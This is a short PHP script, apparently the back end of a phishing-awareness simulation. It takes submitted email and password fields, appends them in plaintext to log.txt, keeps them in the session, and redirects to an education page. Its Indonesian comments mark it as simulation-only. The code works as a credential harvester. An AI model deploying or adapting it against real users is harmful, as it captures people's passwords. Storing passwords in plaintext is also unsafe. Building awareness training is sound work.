<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Simpan ke file log.txt (untuk simulasi, jangan produksi)
    $data = "Email: $email | Password: $password\n";
    file_put_contents("log.txt", $data, FILE_APPEND);

    // Simpan ke session untuk ditampilkan di edukasi
    $_SESSION['email'] = $email;
    $_SESSION['password'] = $password;

    // Redirect ke halaman edukasi
    header("Location: edukasi.php");
    exit();
}
?>
